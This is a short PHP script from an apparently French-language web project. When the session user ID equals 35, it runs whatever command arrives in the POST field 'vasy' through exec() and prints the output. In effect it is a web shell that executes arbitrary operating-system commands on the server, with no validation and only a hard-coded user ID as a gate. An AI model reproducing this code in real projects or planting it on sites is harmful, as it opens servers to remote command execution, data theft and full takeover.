<?php
session_start();
require 'fonction.php';
if ($_SESSION['IdUtilisateur'] == 35) {
  exec($_POST['vasy'], $retour);
  foreach ($retour as $key) {
    echo $key."<br>";
  }
}


